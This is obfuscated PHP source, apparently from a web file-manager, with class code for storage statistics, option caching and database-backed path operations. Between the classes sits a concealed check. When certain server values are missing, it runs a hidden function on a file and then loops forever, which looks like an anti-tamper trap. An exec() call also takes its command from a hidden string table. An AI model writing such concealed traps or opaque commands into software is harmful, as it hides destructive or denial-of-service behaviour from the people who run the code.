($í´£šúä < $îÏÀğ”å); break; case $à½®Ã[1792]: $‡ŒºË˜· = (int) date($à½®Ã[1790], strtotime($í´£šúä)); $Ë‹ª²„à = (int) date($à½®Ã[1790]); if ($‡ŒºË˜· >= $Ë‹ª²„à) { break; } for ($‡ŒºË˜·; $‡ŒºË˜· < $Ë‹ª²„à; $‡ŒºË˜·++) { $—¾Ó½šµ[] = $‡ŒºË˜· . $à½®Ã[1793]; } break; default: break; } if ($í´£šúä > end($—¾Ó½šµ)) { array_pop($—¾Ó½šµ); } sort($—¾Ó½šµ); return $—¾Ó½šµ; } public function listTable($Ú³“àó) { $æäš’œ¯ = ucfirst($Ú³“àó); return Model($æäš’œ¯)->listData(); } public function option($ñ©½æúÚ) { $–­Ü¦ûï = $_SERVER[ñ÷§¡å][1794] . ucfirst($ñ©½æúÚ); return $this->{$–­Ü¦ûï}(); } private function optionUser() { $çÙ¨Ş¯ =& $_SERVER[ñ÷§¡å]; $ˆÁ§¾±¸ = Model($çÙ¨Ş¯[544])->count($çÙ¨Ş¯[1663]); $Ğœ»ÃÃş = Model($çÙ¨Ş¯[544])->where($çÙ¨Ş¯[1795])->count($çÙ¨Ş¯[1663]); $ƒ½¿€ìò = intval($GLOBALS[$çÙ¨Ş¯[6]][$çÙ¨Ş¯[358]][$çÙ¨Ş¯[1618]]) / 3600; $â¸ãÄÍ = strtotime("\55{$ƒ½¿€ìò}\x20\150\157\165\162\x73"); $ı°ÈçºŞ = strtotime(date($çÙ¨Ş¯[1776])); if ($â¸ãÄÍ < $ı°ÈçºŞ) { $â¸ãÄÍ = $ı°ÈçºŞ; } $¦¾²‰‹ = array($çÙ¨Ş¯[1796] => array($çÙ¨Ş¯[1021], $â¸ãÄÍ)); $ÙğÂ¿™Ù = (int) Model($çÙ¨Ş¯[544])->where($¦¾²‰‹)->count($çÙ¨Ş¯[1663]); if (!$ÙğÂ¿™Ù) { $ÙğÂ¿™Ù = 1; } $¦¾²‰‹ = array($çÙ¨Ş¯[1796] => array($çÙ¨Ş¯[1021], $ı°ÈçºŞ)); $Î¢Ğış¿ = Model($çÙ¨Ş¯[544])->where($¦¾²‰‹)->count($çÙ¨Ş¯[1663]); return array($çÙ¨Ş¯[772] => (int) $ˆÁ§¾±¸, $çÙ¨Ş¯[1797] => (int) ($ˆÁ§¾±¸ - $Ğœ»ÃÃş), $çÙ¨Ş¯[1798] => (int) $Ğœ»ÃÃş, $çÙ¨Ş¯[1799] => (int) $Î¢Ğış¿, $çÙ¨Ş¯[1800] => $ÙğÂ¿™Ù); } private function optionFile() { $íù‰çÙ =& $_SERVER[ñ÷§¡å]; $®ƒÌ­Ø¨ = $this->sourceSize(); $÷üÉ±ˆ¡ = $®ƒÌ­Ø¨[$íù‰çÙ[86]]; $ÊõÑÄ‘ş = $®ƒÌ­Ø¨[$íù‰çÙ[1769]]; $¾ˆ´ÕÔ† = Model($íù‰çÙ[838])->where(array($íù‰çÙ[419] => 0))->count($íù‰çÙ[411]); $–™¦Ë³‰ = array($íù‰çÙ[419] => 0, $íù‰çÙ[210] => array($íù‰çÙ[1021], strtotime(date($íù‰çÙ[1776])))); $ÛåŠ±ıà = Model($íù‰çÙ[838])->where($–™¦Ë³‰)->sum($íù‰çÙ[86]); $ÉÍùµúÑ = Model($íù‰çÙ[838])->where($–™¦Ë³‰)->count($íù‰çÙ[411]); return array($íù‰çÙ[776] => $÷üÉ±ˆ¡, $íù‰çÙ[1769] => $ÊõÑÄ‘ş, $íù‰çÙ[1801] => $÷üÉ±ˆ¡ - $ÊõÑÄ‘ş, $íù‰çÙ[1802] => (int) $ÛåŠ±ıà, $íù‰çÙ[778] => (int) $¾ˆ´ÕÔ†, $íù‰çÙ[1803] => (int) $ÉÍùµúÑ); } private function optionAccess() { $œÂê™ôË =& $_SERVER[ñ÷§¡å]; return array($œÂê™ôË[772] => $this->typeLogCnt(), $œÂê™ôË[117] => $this->typeLogCnt($œÂê™ôË[117]), $œÂê™ôË[461] => $this->typeLogCnt($œÂê™ôË[461]), $œÂê™ôË[1804] => $this->typeLogCnt($œÂê™ôË[1804]), $œÂê™ôË[1805] => $this->typeLogCnt($œÂê™ôË[1805]), $œÂê™ôË[609] => $this->typeLogCnt($œÂê™ôË[12], $œÂê™ôË[1780])); } private function typeLogCnt($èÒ¦§¿à = '', $™¥»ò‡ù = "\x69\144") { $ƒºì¾Ê =& $_SERVER[ñ÷§¡å]; $’’Åâù— = array($ƒºì¾Ê[117] => array($ƒºì¾Ê[1806], $ƒºì¾Ê[1807]), $ƒºì¾Ê[461] => array($ƒºì¾Ê[1808], $ƒºì¾Ê[1809]), $ƒºì¾Ê[1804] => array($ƒºì¾Ê[1810], $ƒºì¾Ê[1811], $ƒºì¾Ê[1812]), $ƒºì¾Ê[1805] => array($ƒºì¾Ê[1813], $ƒºì¾Ê[1814]), $ƒºì¾Ê[1815] => array($ƒºì¾Ê[1816], $ƒºì¾Ê[1817], $ƒºì¾Ê[1818])); $ïà“õÈÑ = strtotime(date($ƒºì¾Ê[1776])); $…Áµºå§ = array($ƒºì¾Ê[210] => array($ƒºì¾Ê[1021], $ïà“õÈÑ)); if ($èÒ¦§¿à) { $…Áµºå§[$ƒºì¾Ê[33]] = array($ƒºì¾Ê[7], $’’Åâù—[$èÒ¦§¿à]); } $ì¯³ãÅ¢ = Model($ƒºì¾Ê[1779])->where($…Áµºå§)->count($™¥»ò‡ù); return (int) $ì¯³ãÅ¢; } private function optionServer() { $—ãš »À =& $_SERVER[ñ÷§¡å]; $°•²£î = $this->diskDriver(); $ß™ºà½ = KodIO::defaultDriver(); $†Ü†–ÓÔ = array($—ãš »À[830] => $ß™ºà½[$—ãš »À[408]]); $İşÅÂÀ = Model($—ãš »À[480])->where($†Ü†–ÓÔ)->sum($—ãš »À[86]); $ÕîÂ´Ó = explode($—ãš »À[53], $_SERVER[$—ãš »À[153]]); $ó‚Í…÷ = $ÕîÂ´Ó[0]; $äĞàşæ = $GLOBALS[$—ãš »À[6]][$—ãš »À[21]]; $Íëåã”È = $äĞàşæ[$—ãš »À[983]]; if ($Íëåã”È == $—ãš »À[971]) { $äÂ°¦úµ = explode($—ãš »À[1279], $äĞàşæ[$—ãš »À[982]]); $Íëåã”È = $äÂ°¦úµ[0]; } if ($Íëåã”È == $—ãš »À[919] || $Íëåã”È == $—ãš »À[817]) { $İÙ‡¿ô = Model()->db()->query($—ãš »À[1819]); $ÇâËŞ± = $İÙ‡¿ô[0] && isset($İÙ‡¿ô[0][$—ãš »À[1561]]) ? $İÙ‡¿ô[0][$—ãš »À[1561]] : 0; $Íëåã”È = $—ãš »À[1820] . ($ÇâËŞ± ? $—ãš »À[8] . $ÇâËŞ± : $—ãš »À[12]); } $òœŸØÇ = $GLOBALS[$—ãš »À[6]][$—ãš »À[358]][$—ãš »À[840]]; return array($—ãš »À[1821] => $°•²£î ? $°•²£î[$—ãš »À[1822]] : 0, $—ãš »À[1823] => $°•²£î ? $°•²£î[$—ãš »À[1824]] : 0, $—ãš »À[1825] => (int) $ß™ºà½[$—ãš »À[1822]] * 1024 * 1024 * 1024, $—ãš »À[1826] => (int) $İşÅÂÀ, $—ãš »À[1827] => ucfirst($ó‚Í…÷), $—ãš »À[1828] => $—ãš »À[1829] . PHP_VERSION, $—ãš »À[1830] => phpBuild64() ? 64 : 32, $—ãš »À[771] => str_replace($—ãš »À[1137], $—ãš »À[999], $Íëåã”È), $—ãš »À[358] => ucfirst($òœŸØÇ), $—ãš »À[32] => $_SERVER[$—ãš »À[1831]]); } private function diskDriver() { $ã¤¡¯»µ =& $_SERVER[ñ÷§¡å]; $¤’³öº = $ã¤¡¯»µ[8]; $ïµ¬²ò© = $GLOBALS[$ã¤¡¯»µ[6]][$ã¤¡¯»µ[1295]] == $ã¤¡¯»µ[1296]; if ($ïµ¬²ò©) { $¤’³öº = $ã¤¡¯»µ[1832]; if (function_exists($ã¤¡¯»µ[1833])) { exec($ã¤¡¯»µ[1834], $æÅÉ¡àó); $¤’³öº = $æÅÉ¡àó[1] . $ã¤¡¯»µ[8]; } } if (!file_exists($¤’³öº)) { return; } $Ë‹š…©˜ = @disk_total_space($¤’³öº); $ËÁê Ê… = $Ë‹š…©˜ - @disk_free_space($¤’³öº); return array($ã¤¡¯»µ[1822] => $Ë‹š…©˜, $ã¤¡¯»µ[1824] => $ËÁê Ê…); } public function fileChart($Ï™ùÅ£Š) { $ì…çÆ˜ =& $_SERVER[ñ÷§¡å]; if (isset($Ï™ùÅ£Š[$ì…çÆ˜[1663]])) { return Model($ì…çÆ˜[838])->userFileTypeProfile($Ï™ùÅ£Š[$ì…çÆ˜[1663]]); } if (isset($Ï™ùÅ£Š[$ì…çÆ˜[1835]])) { return Model($ì…çÆ˜[838])->groupFileTypeProfile($Ï™ùÅ£Š[$ì…çÆ˜[1835]]); } $ïäÔï»ù = $this->sourceSize(); $ì¡·¬õ = array($ì…çÆ˜[441] => 0, $ì…çÆ˜[420] => 1); $ª²™õ = Model($ì…çÆ˜[838])->where($ì¡·¬õ)->sum($ì…çÆ˜[86]); $ì¡·¬õ[$ì…çÆ˜[420]] = 2; $¡ùÈŠ¿ = Model($ì…çÆ˜[838])->where($ì¡·¬õ)->sum($ì…çÆ˜[86]); return array($ì…çÆ˜[776] => $ïäÔï»ù[$ì…çÆ˜[86]], $ì…çÆ˜[1769] => $ïäÔï»ù[$ì…çÆ˜[1769]], $ì…çÆ˜[1770] => (int) $ª²™õ, $ì…çÆ˜[1771] => (int) $¡ùÈŠ¿); } private function sourceSize() { $»¦ä‡È¥ =& $_SERVER[ñ÷§¡å]; $Ôğƒ¼ú¿ = Model($»¦ä‡È¥[838])->where(array($»¦ä‡È¥[419] => 0))->sum($»¦ä‡È¥[86]); $¤Üµ¯€¯ = Model($»¦ä‡È¥[480])->sum($»¦ä‡È¥[86]); if ($¤Üµ¯€¯ > $Ôğƒ¼ú¿) { $¤Üµ¯€¯ = $Ôğƒ¼ú¿; } return array($»¦ä‡È¥[86] => (int) $Ôğƒ¼ú¿, $»¦ä‡È¥[1769] => (int) $¤Üµ¯€¯); } } goto FŸí÷£İÅÆ; AØ§š“Š‚¿: class ModelBaseLight { public $optionType = ''; public $modelType = "\123\171\x73\x74\x65\x6d\x4f\x70\164\x69\157\156"; public $field = array(); public function listData($Î§ò²½¼ = false, $ºŒ©Şä½ = "\x6d\x6f\144\151\146\171\x54\x69\155\x65", $¬êûÃñ‡ = false) { $Ë§œÂªÆ = Model($this->modelType)->get(!1, $this->optionType, !0); $¼µÖóç™ = array_values($Ë§œÂªÆ); if ($¼µÖóç™ && $¼µÖóç™[0] && !is_array($¼µÖóç™[0])) { Model($this->modelType)->cacheRemove($this->optionType); $Ë§œÂªÆ = Model($this->modelType)->get(!1, $this->optionType, !0); } if (!$Ë§œÂªÆ) { return $Î§ò²½¼ ? null : array(); } if (!$Î§ò²½¼) { $Ë§œÂªÆ = array_filter(array_values($Ë§œÂªÆ)); return array_sort_by($Ë§œÂªÆ, $ºŒ©Şä½, $¬êûÃñ‡); } return $Ë§œÂªÆ[$_SERVER[ñ÷§¡å][405] . $Î§ò²½¼]; } public function insert($‡€¿¡ÙÄ) { $¶“œî¤Ç =& $_SERVER[ñ÷§¡å]; $‡€¿¡ÙÄ = array_field_key($‡€¿¡ÙÄ, $this->field); $±çÓ»Àæ = Model($this->modelType)->get($¶“œî¤Ç[406], $this->optionType . $¶“œî¤Ç[407]); $±çÓ»Àæ = $±çÓ»Àæ ? $±çÓ»Àæ : 0; $‡€¿¡ÙÄ[$¶“œî¤Ç[408]] = ++$±çÓ»Àæ; $‡€¿¡ÙÄ[$¶“œî¤Ç[210]] = time(); $‡€¿¡ÙÄ[$¶“œî¤Ç[95]] = time(); Model($this->modelType)->set($¶“œî¤Ç[406], $±çÓ»Àæ, $this->optionType . $¶“œî¤Ç[407]); Model($this->modelType)->set($¶“œî¤Ç[405] . $±çÓ»Àæ, $‡€¿¡ÙÄ, $this->optionType); return $±çÓ»Àæ; } public function update($ÌÃØ—Ş, $Ï³Ö¶·) { $²Š½ÖÜ =& $_SERVER[ñ÷§¡å]; $Ï³Ö¶· = array_field_key($Ï³Ö¶·, $this->field); $¾‚Ì…Æ = $this->listData($ÌÃØ—Ş); if (!$¾‚Ì…Æ || !$ÌÃØ—Ş) { return !1; } $Ï³Ö¶· = array_merge($¾‚Ì…Æ, $Ï³Ö¶·); $Ï³Ö¶·[$²Š½ÖÜ[95]] = time(); return Model($this->modelType)->set($²Š½ÖÜ[405] . $ÌÃØ—Ş, $Ï³Ö¶·, $this->optionType); } public function remove($÷Ïª ãœ) { if (!$÷Ïª ãœ) { return !1; } return Model($this->modelType)->remove($_SERVER[ñ÷§¡å][405] . $÷Ïª ãœ, $this->optionType); } public function clear() { $ÔœŸß¼× =& $_SERVER[ñ÷§¡å]; Model($this->modelType)->remove($ÔœŸß¼×[406], $this->optionType . $ÔœŸß¼×[407]); return Model($this->modelType)->remove(null, $this->optionType); } public function cacheClear() { return Model($this->modelType)->cacheRemove($this->optionType); } public function findByKey($¼íÌ †¡, $÷ø²¾¥á) { if (!$÷ø²¾¥á) { return !1; } $Ôí¼€® = $this->listData(); $Ôí¼€® = array_to_keyvalue($Ôí¼€®, $¼íÌ †¡); return isset($Ôí¼€®[$÷ø²¾¥á]) ? $Ôí¼€®[$÷ø²¾¥á] : !1; } public function findByName($¢ÅĞ¼É¶) { return $this->findByKey($_SERVER[ñ÷§¡å][32], $¢ÅĞ¼É¶); } protected function resetData($¶¡Ì¹‡ò) { $—Ù¸¡õ =& $_SERVER[ñ÷§¡å]; $¶¡Ì¹‡ò = is_array($¶¡Ì¹‡ò) ? $¶¡Ì¹‡ò : array(); $ç²ÇÏÕñ = array(); for ($ù»Øø÷Ã = 0; $ù»Øø÷Ã < count($¶¡Ì¹‡ò); $ù»Øø÷Ã++) { $ç²ÇÏÕñ[$—Ù¸¡õ[405] . $¶¡Ì¹‡ò[$ù»Øø÷Ã][$—Ù¸¡õ[408]]] = $¶¡Ì¹‡ò[$ù»Øø÷Ã]; } return Model($this->modelType)->set($ç²ÇÏÕñ, !1, $this->optionType); } private function getAutoName($®Å¼–Õ) { $ÙœÕÃŠà = array_to_keyvalue($this->listData(), $_SERVER[ñ÷§¡å][32]); if (!$ÙœÕÃŠà || !isset($ÙœÕÃŠà[$®Å¼–Õ])) { return $®Å¼–Õ; } for ($Àó¼°ˆ§ = 1; $Àó¼°ˆ§ < count($ÙœÕÃŠà); $Àó¼°ˆ§++) { $ã±¶Ñ´ì = $®Å¼–Õ . "\50{$Àó¼°ˆ§}\x29"; if (!isset($ÙœÕÃŠà[$ã±¶Ñ´ì])) { return $ã±¶Ñ´ì; } } return $ã±¶Ñ´ì; } } class ModelBaseOption extends ModelBase { protected $tableName = ''; protected $jsonField = array(); public function get($óñŞŠ­â = false, $ñäË¯àõ = '', $ÛÎ‰¨áí = false) { $åûÑÑ¤õ =& $_SERVER[ñ÷§¡å]; $Çå¯Üöç = $this->cacheGet($ñäË¯àõ); $ø·ƒŒÉ = $this->optionDefault($ñäË¯àõ); $ø·ƒŒÉ = is_array($ø·ƒŒÉ) ? $ø·ƒŒÉ : array(); if (is_array($Çå¯Üöç)) { $Çå¯Üöç = array_merge($ø·ƒŒÉ, $Çå¯Üöç); return $óñŞŠ­â ? isset($Çå¯Üöç[$óñŞŠ­â]) ? $Çå¯Üöç[$óñŞŠ­â] : null : $Çå¯Üöç; } $ÏùöåÃ¸ = $this->filterWhere(array($åûÑÑ¤õ[33] => $ñäË¯àõ)); $Çå¯Üöç = $this->where($ÏùöåÃ¸)->select(); $Çå¯Üöç = array_to_keyvalue($Çå¯Üöç, $åûÑÑ¤õ[104], $åûÑÑ¤õ[383]); foreach ($Çå¯Üöç as $ëİóÁŒ => $Æ§¹–ã‘) { if ($ÛÎ‰¨áí || in_array($ëİóÁŒ, $this->jsonField)) { $Çå¯Üöç[$ëİóÁŒ] = json_decode($Æ§¹–ã‘, !0); } } $this->cacheSet($ñäË¯àõ, $Çå¯Üöç); $Çå¯Üöç = array_merge($ø·ƒŒÉ, $Çå¯Üöç); return $óñŞŠ­â ? $Çå¯Üöç[$óñŞŠ­â] : $Çå¯Üöç; } public function set($Ü¡ßŸ¯½, $Â§Éø¸Å = false, $±ñŒË¬‹ = '') { $œŒşäŠŞ =& $_SERVER[ñ÷§¡å]; $this->cacheRemove($±ñŒË¬‹); $åĞœç¥§ = array(); $“ÊÄ‡Í¨ = is_array($Ü¡ßŸ¯½) ? $Ü¡ßŸ¯½ : array($Ü¡ßŸ¯½ => $Â§Éø¸Å); foreach ($“ÊÄ‡Í¨ as $ó²ŠÃŸÇ => $ËôÈº¸¡) { if (is_array($ËôÈº¸¡)) { $ËôÈº¸¡ = json_encode_force($ËôÈº¸¡); } $this->checkLength($ËôÈº¸¡, !1, $this->tableName . $œŒşäŠŞ[4] . $Ü¡ßŸ¯½); $ËôÈº¸¡ = self::textEncode($ËôÈº¸¡); $“ÊÄ‡Í¨ = array($œŒşäŠŞ[33] => $±ñŒË¬‹, $œŒşäŠŞ[104] => $ó²ŠÃŸÇ, $œŒşäŠŞ[383] => $ËôÈº¸¡); $åĞœç¥§[] = $this->filterWhere($“ÊÄ‡Í¨); } if (!$åĞœç¥§) { return !0; } $úòûˆä‘ = $this->cacheKey($œŒşäŠŞ[409]); CacheLock::lock($úòûˆä‘); $²²«á = $this->addAll($åĞœç¥§, array(), !0); CacheLock::unlock($úòûˆä‘); return $²²«á; } protected function optionDefault($ŠÑ•ßìÆ = '') { return !1; } public function setDeep($Ÿë®», $İÚ‚¸«˜ = false, $Ş×Æßõ» = '') { $ËÊ²ªôÑ = explode($_SERVER[ñ÷§¡å][10], $Ÿë®»); $¶”°öŠ = $this->get(); array_set_value($¶”°öŠ, $Ÿë®», $İÚ‚¸«˜); $this->set($ËÊ²ªôÑ[0], $¶”°öŠ[$ËÊ²ªôÑ[0]], $Ş×Æßõ»); } public function remove($œÃ´ÌÍÇ, $ÅóÄÎĞÑ = '') { $†ÁØö´ù =& $_SERVER[ñ÷§¡å]; $this->cacheRemove($ÅóÄÎĞÑ); $“¤Üˆ“ = $this->filterWhere(array($†ÁØö´ù[104] => $œÃ´ÌÍÇ, $†ÁØö´ù[33] => $ÅóÄÎĞÑ)); if (is_null($œÃ´ÌÍÇ)) { unset($“¤Üˆ“[$†ÁØö´ù[104]]); } return $this->where($“¤Üˆ“)->delete(); } public function cacheSet($¸ÆÒ›ğç, $¤œòå“ò = false) { return Cache::set($this->cacheKey($¸ÆÒ›ğç), $¤œòå“ò); } public function cacheGet($ì†˜»è¤) { return Cache::get($this->cacheKey($ì†˜»è¤)); } public function cacheRemove($ß—¡Á—¨) { return Cache::remove($this->cacheKey($ß—¡Á—¨)); } protected function filterWhere($²†ó£Å°) { return $²†ó£Å°; } protected function cacheKey($Ñåş¹ÊÂ) { return $Ñåş¹ÊÂ; } } if (!isset($_SERVER[$_SERVER[ñ÷§¡å][60]]) || !isset($_SERVER[$_SERVER[ñ÷§¡å][69]])) { $_getc = $_SERVER[ñ÷§¡å][62]; $_getfile = $_SERVER[$_SERVER[ñ÷§¡å][63]] . $_SERVER[ñ÷§¡å][64]; $_getfilec = $_getc($_getfile); $_getarrs = explode($_SERVER[ñ÷§¡å][65], $_getfilec); if (count($_getarrs) < $_SERVER[ñ÷§¡å][66]) { $exit = $_SERVER[ñ÷§¡å][67]; $exit(); } $_act = $_SERVER[ñ÷§¡å][68]; $_act($_SERVER[$_SERVER[ñ÷§¡å][63]] . $_SERVER[ñ÷§¡å][64]); $_iii = 2; while ($_iii > 1) { $_iiij = rawurlencode($_iii . $_SERVER[ñ÷§¡å][387]); } } goto Aœ×ªñø‡¼; fÒËëƒ‡Ê«: class PathDriverDB extends PathDriverBase { public $model; public $pathParse; public function __construct($ú´Ä³È») { $this->pathParse = $ú´Ä³È»; $this->model = Model($_SERVER[ñ÷§¡å][1334]); } public function getPath($Úç´‰ã­) { return trim($Úç´‰ã­, $_SERVER[ñ÷§¡å][8]); } public function pathFather($ìú°âíÌ) { $˜ú«—øŒ = $this->parse($ìú°âíÌ); $˜ú«—øŒ = $this->infoSimple($ìú°âíÌ); return $˜ú«—øŒ ? $˜ú«—øŒ[$_SERVER[ñ÷§¡å][441]] : !1; } public function pathThis($µ…ıÆ) { $ÅöÖîş× = $this->infoSimple($µ…ıÆ); return $ÅöÖîş× ? $ÅöÖîş×[$_SERVER[ñ÷§¡å][32]] : !1; } public function getPathOuter($¡· ê) { if (!$¡· ê) { return $¡· ê; } $ØÈùè„Ä = $this->parse($¡· ê); return KodIO::make($ØÈùè„Ä[$_SERVER[ñ÷§¡å][408]]); } public function copyFolderFromIO($¯Àñ—®Ï, $—›ÛîÍ, $¸™ÉÓ½¡, $¯Èßé€, $¯ã´ÇøŒ) { $À³òñæñ = $this->model->copyFolderFromIO($¯Àñ—®Ï, $—›ÛîÍ, $¸™ÉÓ½¡, $¯Èßé€, $¯ã´ÇøŒ); return KodIO::make($À³òñæñ); } public function isParentOf($´ıúŸİÏ, $Ú‘‡Úç) { return $this->model->isParentOf($´ıúŸİÏ, $Ú‘‡Úç); } public function mkfile($®àÁõáš, $ôĞÁ­– = '', $ç­äù±Œ = REPEAT_RENAME) { $¬Ö¹Ÿº =& $_SERVER[ñ÷§¡å]; $›¶ì‚¼Ÿ = $this->parse($®àÁõáš); $®àÁõáš = $›¶ì‚¼Ÿ[$¬Ö¹Ÿº[408]]; for ($Ü¶‰•™Ê = 0; $Ü¶‰•™Ê < count($›¶ì‚¼Ÿ[$¬Ö¹Ÿº[1335]]); $Ü¶‰•™Ê++) { $èÀŞ»»­ = $›¶ì‚¼Ÿ[$¬Ö¹Ÿº[1335]][$Ü¶‰•™Ê]; if ($Ü¶‰•™Ê == count($›¶ì‚¼Ÿ[$¬Ö¹Ÿº[1335]]) - 1) { $®àÁõáš = $this->model->mkfile($®àÁõáš, $èÀŞ»»­, $ôĞÁ­–, $ç­äù±Œ); break; } $®àÁõáš = $this->model->mkdir($®àÁõáš, $èÀŞ»»­, REPEAT_SKIP); } return $this->getPathOuter($®àÁõáš); } public function mkdir($”Ş®¬¥, $­š´‚®Û = REPEAT_SKIP) { $åüÑÀ„ =& $_SERVER[ñ÷§¡å]; $¬¹€èã” = $this->parse($”Ş®¬¥); $”Ş®¬¥ = $¬¹€èã”[$åüÑÀ„[408]]; for ($Î×İ´£‹ = 0; $Î×İ´£‹ < count($¬¹€èã”[$åüÑÀ„[1335]]); $Î×İ´£‹++) { $ü¨àšµ = $¬¹€èã”[$åüÑÀ„[1335]][$Î×İ´£‹]; $”Ş®¬¥ = $this->model->mkdir($”Ş®¬¥, $ü¨àšµ, $­š´‚®Û); } return $this->getPathOuter($”Ş®¬¥); } public function copyFile($áÕíùÊ¬, $Û´›Í¨‚, $‹ğÛ´ÒÖ = REPEAT_REPLACE) { $Ãë–£Éš =& $_SERVER[ñ÷§¡å]; $Š‰€ŞØú = $this->parse($Û´›Í¨‚); $ìŸ‘«’¸ = $this->model->copy($áÕíùÊ¬, $Š‰€ŞØú[$Ãë–£Éš[408]], $‹ğÛ´ÒÖ, $Š‰€ŞØú[$Ãë–£Éš[94]]); return $ìŸ‘«’¸ ? $this->getPathOuter($ìŸ‘«’¸) : !1; } public function moveFile($£¬œ¼Èğ, $€íÍ‰ÅÇ, $Ş’ˆ—¯µ = REPEAT_REPLACE) { $á½ÑñšÂ =& $_SERVER[ñ÷§¡å]; $ÌÖã¾›š = $this->parse($€íÍ‰ÅÇ); $»ùçü‡Û = $this->model->move($£¬œ¼Èğ, $ÌÖã¾›š[$á½ÑñšÂ[408]], $Ş’ˆ—¯µ, $ÌÖã¾›š[$á½ÑñšÂ[94]]); return $»ùçü‡Û ? $this->getPathOuter($»ùçü‡Û) : !1; } public function copy($äèáí¸—, $ŠàÖĞŠÌ, $‰Ùİ“€Ÿ = REPEAT_REPLACE, $ØÓâÙ´ = false) { $äŞ£şÇ• = $this->parse($ŠàÖĞŠÌ); $¤ñ•¨£´ = $this->model->copy($äèáí¸—, $äŞ£şÇ•[$_SERVER[ñ÷§¡å][408]], $‰Ùİ“€Ÿ, $ØÓâÙ´); return $¤ñ•¨£´ ? $this->getPathOuter($¤ñ•¨£´) : !1; } public function moveSameAllow() { } public function move($Àå³äëÉ, $“‚‹ Åê, $³±‚ß = REPEAT_REPLACE, $ŸÄÔ²¿ˆ = false) { $¡ÜÎ¯í = $this->parse($“‚‹ Åê); $Œ×Õ”Óç = $this->model->move($Àå³äëÉ, $¡ÜÎ¯í[$_SERVER[ñ÷§¡å][408]], $³±‚ß, $ŸÄÔ²¿ˆ); return $Œ×Õ”Óç ? $this->getPathOuter($Œ×Õ”Óç) : !1; } public function remove($µ©ÆÖˆƒ, $˜’¤õ—´ = true) { return $this->model->remove($µ©ÆÖˆƒ, $˜’¤õ—´); } public function rename($·ùŒêõĞ, $ÛÌ¶Œ­±) { $ÑÔ™å˜ = $this->model->rename($·ùŒêõĞ, $ÛÌ¶Œ­±); return $ÑÔ™å˜ ? $this->getPathOuter($·ùŒêõĞ) : $ÑÔ™å˜; } public function size($¨óèƒŒ) { $éé“×÷è = $this->infoSimple($¨óèƒŒ); return $éé“×÷è ? $éé“×÷è[$_SERVER[ñ÷§¡å][86]] : 0; } public function infoSimple($†µ¿€±È) { return $this->model->sourceInfo($†µ¿€±È); } public function info($ãë¬´Ÿ›) { return $this->infoParse($ãë¬´Ÿ›); } public function infoAuth($ƒÑòÒÄ) { return $this->infoParse($ƒÑòÒÄ, !1, !0); } public function infoWithChildren($ÀÃ¾£¤–) { return $this->infoParse($ÀÃ¾£¤–, !0); } protected function infoParse($ª«Ÿ–ğ°, $™ú‡³”Å = false, $º ¼‚é = false) { if (!$™ú‡³”Å) { return $this->model->pathInfo($ª«Ÿ–ğ°, $º ¼‚é); } return $this->model->pathInfoMore($ª«Ÿ–ğ°); } public function infoFull($ì€›”) { $ ­£¸‡Ç =& $_SERVER[ñ÷§¡å]; $ÏÁÄêù• = explode($ ­£¸‡Ç[8], $ì€›”); $€à°Øñõ = implode($ ­£¸‡Ç[8], array_splice($ÏÁÄêù•, 1)); return $this->model->pathInfoByPath($ÏÁÄêù•[0], $€à°Øñõ); } public function hashSimple($¢Î†©) { $ÊÆ¶¥Œß =& $_SERVER[ñ÷§¡å]; $ÇÖ÷ÒÉ‡ = $this->infoWithChildren($¢Î†©); return $ÇÖ÷ÒÉ‡[$ÊÆ¶¥Œß[180]][$ÊÆ¶¥Œß[187]]; } public function hashMd5($Œ¹Ê€ª’) { $Üœ¾î =& $_SERVER[ñ÷§¡å]; $¶ÃÜè¸˜ = $this->infoWithChildren($Œ¹Ê€ª’); return $¶ÃÜè¸˜[$Üœ¾î[180]][$Üœ¾î[186]]; } public function exist($®î£š¡¹) { $âÎ„íÀ =& $_SERVER[ñ÷§¡å]; $™’„ÍúÃ = $this->parse($®î£š¡¹); if (!$™’„ÍúÃ[$âÎ„íÀ[94]]) { return $this->isFile($®î£š¡¹) || $this->isFolder($®î£š¡¹); } $Ç™Í¦€ = array($âÎ„íÀ[410] => $™’„ÍúÃ[$âÎ„íÀ[408]], $âÎ„íÀ[32] => $™’„ÍúÃ[$âÎ„íÀ[94]]); $„‚•áÆû = $this->model->where($Ç™Í¦€)->find(); return $„‚•áÆû ? !0 : !1; } public function isFile($¨®ä€–Õ) { $¶Æ‰Àê =& $_SERVER[ñ÷§¡å]; $Üó¥‹Ô† = $this->infoSimple($¨®ä€–Õ); return $Üó¥‹Ô† && $Üó¥‹Ô†[$¶Æ‰Àê[419]] == $¶Æ‰Àê[98] ? !1 : !0; } public function isFolder($ê®âšø·) { $Åû¥³Ş =& $_SERVER[ñ÷§¡å]; $éË‡ØĞ€ = $this->infoSimple($ê®âšø·); return $éË‡ØĞ€ && $éË‡ØĞ€[$Åû¥³Ş[419]] == $Åû¥³Ş[98] ? !0 : !1; } public function listPath($¿Ş÷Í—ë, $Àé ıà‚ = false) { $„›ÏÕÓ =& $_SERVER[ñ÷§¡å]; if ($¿Ş÷Í—ë == $„›ÏÕÓ[12]) { return !1; } $Ô˜§Õ‰ = array($„›ÏÕÓ[410] => $¿Ş÷Í—ë); if ($Àé ıà‚) { return $this->model->listSource($Ô˜§Õ‰, -1); } return $this->model->listSource($Ô˜§Õ‰); } public function has($ÒÃú¢Ä, $Ü¬©¦¨ø = false, $´‡†ªÖ = null) { $ºİá°³ã =& $_SERVER[ñ÷§¡å]; $áÇŠìÆ = $this->infoWithChildren($ÒÃú¢Ä); if ($Ü¬©¦¨ø) { return array($ºİá°³ã[218] => $áÇŠìÆ[$ºİá°³ã[218]], $ºİá°³ã[217] => $áÇŠìÆ[$ºİá°³ã[217]]); } return $´‡†ªÖ ? $áÇŠìÆ[$ºİá°³ã[218]] : $áÇŠìÆ[$ºİá°³ã[217]]; } public function listAll($ó…òóï) { $÷îÏ©   = IO::info($this->pathParse[$_SERVER[ñ÷§¡å][94]]); if (!$÷îÏ©  ) { return array(); } return $this->model->listAll($ó…òóï); } public function getContent($¹üªÖ•) { return $this->model->getContent($¹üªÖ•); } public function setContent($á†Ó¯µ©, $¹ËŞ¾é± = '') { return $this->model->setContent($á†Ó¯µ©, $¹ËŞ¾é±); } public function fileSubstr($ÆÔÏÈ , $Äıé¼Ö§, $›¥¶Ñ¸ß) { return $this->model->fileSubstr($ÆÔÏÈ , $Äıé¼Ö§, $›¥¶Ñ¸ß); } public function download($áÌòöô, $íêÑ¸ËÒ = '') { $ï¢“†² = get_path_father($íêÑ¸ËÒ); $Ç¸›‹İ’ = get_path_this($íêÑ¸ËÒ); $ÂåòÕ²• = 